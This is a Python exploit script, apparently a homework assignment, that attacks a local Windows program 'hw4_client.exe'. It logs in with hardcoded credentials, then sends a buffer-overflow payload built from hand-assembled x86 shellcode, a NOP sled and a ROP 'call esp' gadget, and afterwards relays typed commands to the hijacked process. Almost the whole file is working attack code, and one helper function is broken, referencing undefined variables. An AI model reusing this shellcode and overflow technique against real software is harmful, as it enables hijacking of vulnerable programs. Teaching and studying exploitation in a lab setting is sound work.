
import os
import time
import subprocess
from subprocess import PIPE, STDOUT
import sys
from sys import argv
import ctypes
import struct
import utils as ropper
from ctypes import wintypes, windll, POINTER, byref, sizeof, c_char
from ctypes.wintypes import *

from numpy.core import byte


jmptoshell = "e9 5f df ff ff"



def byteArrWord(inputString,type):
	byteArr = [byte(4)]*(len(inputString)+1)
	j=0
	for i in inputString:
		if j==0:
			byteArr[j] = byte (type)
		elif j >0 and j<4:
			byteArr[j] = byte (0)
		elif j >=4:	
			byteArr[j] = byte(ord(i))
		j += 1
	byteArr[j] = b'\n'	
	return byteArr	

def byteArrNumber(inputString,type):
	if type == 9:
		byteArr = [byte(0)]*(len(inputString)+1)
	else:	
		byteArr = [byte(0)]*(len(inputString)+7)
	j=0
	if type != 9:
		for j in range (0,6,1):
			if j==0:
				byteArr[j] = byte (type)
			elif j >0 and j<4:
				byteArr[j] = byte (0)
			elif j==4:
				byteArr[j] = byte(ord('.'))	
			elif j==5:
				byteArr[j] = byte(ord(';'))
		j += 1			
	for i in inputString:
		byteArr[j] = byte(ord(i))
		j += 1
	byteArr[j] = b'\n'
	return byteArr	



def get_byt_str(inputString):
	len_str = (len(inputString))
	if len_str > 3:
		code = ['A']*4
		for i in range (0,4,1):
			code[i] =inputString[i]
		op_str = "".join(code)
		type = 0
		if op_str == 'ECHO':
			 type = 1
		elif op_str == 'TIME':
			type = 2
		elif op_str == 'USER':
			type = 4
		elif op_str =="2020":
			type = 5
		elif op_str == 'DMSG':
			type = 6
		elif op_str == 'LOAD':
			type = 8
		elif op_str == 'PEEK':
			type = 7
		elif op_str == 'AUTH':
			type = 3	
		elif op_str == 'exit' and len_str == 4:
			exit = [byte(0x0)]*5
			exit[0] = byte (0x65)
			exit[1] = byte (0x78)
			exit[2] = byte (0x69)
			exit[3] = byte (0x74)
			exit[4] = b'\n'
			return exit
		if type != 0 :
			return 	byteArrWord(inputString,type)
	type = 7
	return byteArrNumber(inputString,type)
	


def calculateRopAddress(ropHex):
	callEspHexByteArray = bytearray.fromhex(ropHex)
	callEspAdress = ((ropper.GetGadgetAddress(callEspHexByteArray)))
	callEsp0 = ((byte(callEspAdress & 0xff)))
	callEsp1 = (byte(((callEspAdress) >>8)& 0xff))
	callEsp2 = (byte(((callEspAdress) >>16)& 0xff))
	callEsp3 = (byte(((callEspAdress) >>24)& 0xff))
	return [callEsp0,callEsp1,callEsp2,callEsp3]
	
def jumpAdress(jumpHex):
	jump0 = ((byte(callEspAdress & 0xff)))
	jump1 = (byte(((callEspAdress) >>8)& 0xff))
	jump2 = (byte(((callEspAdress) >>16)& 0xff))
	jump3 = (byte(((callEspAdress) >>24)& 0xff))
	jump3 = (byte(((callEspAdress) >>24)& 0xff))
	return [jump0,jump1,jump2,jump3,jump4]
	
def buildShellCode():
	
	stack =[0x89, 0xE5, 0x83, 0xED, 0x04, 0xB8, 0x87, 0x1E, 0x40, 0x00] #mov    ebp,esp
																			 #sub    ebp,0x4
																			  #mov    eax,0x401e87
	stack +=[0x50, 0xB8, 0x28, 0xFF, 0x60, 0x00, 0x50]					#push   eax
																			#mov    eax,0x60ff28
																			#push   eax
	stack += [0xB8, 0x00, 0x80, 0x37, 0x00, 0x50, 0xC7, 0x85, 0xE0, 0xFD, 0xFF, 0xFF, 0x65]
																			#mov    eax,0x378000
																			#push   eax
																			#mov    DWORD PTR [ebp-0x220],0x74697865
																			
	stack +=[0x78, 0x69, 0x74, 0x8B, 0x45, 0x14, 0x89, 0x45, 0x08, 0xC7, 0x45, 0x0C, 0x00, 0x00, 0x00, 0x00]
																			#mov    eax,DWORD PTR [ebp+0x14]
																			#mov    DWORD PTR [ebp+0x8],eax
																			#mov    DWORD PTR [ebp+0xc],0x0	
	stack +=[0x81, 0xEC, 0xA0, 0x20, 0x00, 0x00, 0x89, 0x04, 0x24, 0x89, 0xE0, 0x83, 0xC0, 0x14]
																			#sub    esp,0x20a0
																			#mov    DWORD PTR [esp],eax
																			#mov    eax,esp
																			#add    eax,0x14

	stack +=[0x68, 0x00, 0x10, 0x00, 0x00,0x6A, 0x00, 0x50, 0xB8, 0xBC, 0x4B, 0x40, 0x00, 0xFF, 0xD0, 0x58, 0x58, 0x58]
																			#push   0x1000
																			#push   0x0
																			#push   eax
																			#mov    eax,0x404bbc
																			#call   eax
																			#pop    eax  * 3

	stack +=[	0x89, 0xE0, 0x83, 0xC0, 0x14, 0x50, 0x50, 0xC7, 0x04, 0x24, 0x68, 0x61, 0x40, 0x00, 0xB8, 0x9C, 0x4B, 0x40, 0x00, 0xFF, 0xD0]
																			#mov    eax,esp
																			#add    eax,0x14
																			# push   eax * 2
																			#mov    DWORD PTR [esp],0x406168
																			#mov    eax,0x404b9c 			- scanf location
																			#call   scanf

	stack +=[0x58, 0x58, 0x89, 0xE0, 0x83, 0xC0, 0x14, 0x50, 0xB8, 0x64, 0x4B, 0x40, 0x00, 0xFF, 0xD0]
																				#pop    eax * 2
																				#mov    eax,esp
																				#add    eax,0x14
																				#push   eax
																				#mov    eax,0x404b64
																				#call   eax
	stack +=[	0x83, 0xF8, 0x04, 0x5B, 0x75, 0x1E, 0x6A, 0x04, 0x89, 0xE8, 0x2D, 0x20, 0x02, 0x00, 0x00, 0x50, 0x89, 0xE0, 0x83, 0xC0, 0x1C, 0x50, 0xB8, 0x5C, 0x4B, 0x40, 0x00, 0xFF, 0xD0]
																				#cmp    eax,0x4
																				#pop    ebx
																				#jne    0x96
																				#push   0x4
																				#mov    eax,ebp
																				#sub    eax,0x220
																				#push   eax
																				#mov    eax,esp
																				#add    eax,0x1c
																				#mov    eax,0x404b5c
																				#call   eax
	stack +=[	0x5B, 0x5B, 0x5B, 0x85, 0xC0, 0x74, 0x28]
	stack +=[	0xFF, 0x74, 0x24, 0x10, 0xFF, 0x74, 0x24, 0x10, 0x8B, 0x44, 0x24, 0x10, 0x8B, 0x10, 0x83, 0xC0, 0x04, 0x50, 0x52, 0xFF, 0x74, 0x24, 0x10, 0xB8, 0x92, 0x18, 0x40, 0x00, 0xFF, 0xD0]
																			#pop    ebx * 3
																			#test   eax,eax
																			#je     0xbe
																			#push   DWORD PTR [esp+0x10]
																			#mov    eax,DWORD PTR [esp+0x10]
																			#mov    edx,DWORD PTR [eax]
																			#add    eax,0x4
																			#push   eax
																			#push   edx
																			#push   DWORD PTR [esp+0x10]
																			#mov    eax,0x401892 - loc_401892
																			#call loc_401892

	stack +=[	0x58, 0x58, 0x58, 0x58, 0x58]
																			#pop    eax*5

	stack +=[	0xE9, 0x79, 0xFF, 0xFF, 0xFF, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xBA, 0xD1, 0x1D, 0x40, 0x00, 0xFF, 0xE2]
																				#jmp    0x37
																			#mov    eax,0x0
																			#mov    edx,0x401dd1
																			# jmp    edx

	stack +=[	0x90, 0x90, 0x90, 0x90, 0x90]
																				#nops



	shellcode = [b'\x00']*0x20A2

	callEspHex = "FFD4" #call esp opcode
	end_stack = calculateRopAddress(callEspHex) + [0xE9, 0x00, 0xFA, 0xFF, 0xFF]
	totalShellCode = stack + end_stack

	for i in range (0x1000,0x20A2,1):
		shellcode[i] = byte(0x90)


	i =0x0
	for j in stack:
		shellcode[0x1f00+i] = byte(j)
		i +=0x1

	i =0x0
	for j in end_stack:
		shellcode[0x2098+i] = byte(j)
		i +=0x1

	shellcode[0x2098+i]=b'\n'
	
	return shellcode	



def attack(proc):
	#proc = subprocess.Popen('hw4_client.exe',stdin=subprocess.PIPE )

	userName = "archer"
	password = "S43U0SE6NZ4S46S5"
	code = "PEEK"
	shell = buildShellCode()
	
	totalInput = byteArrNumber(userName,9)+byteArrNumber(password,9)+byteArrNumber(code,9) + shell
	for j in totalInput:
		proc.stdin.write(j)
		proc.stdin.flush()	



if __name__ == "__main__":
	proc = subprocess.Popen('hw4_client.exe',stdin=subprocess.PIPE )

	attack(proc)


	currentInput = '' 
	while currentInput != "exit":
		currentInput = input()
		commandInBytes = get_byt_str(currentInput)
		
		for j in commandInBytes:
			proc.stdin.write(j)	
			proc.stdin.flush()


	proc.wait()




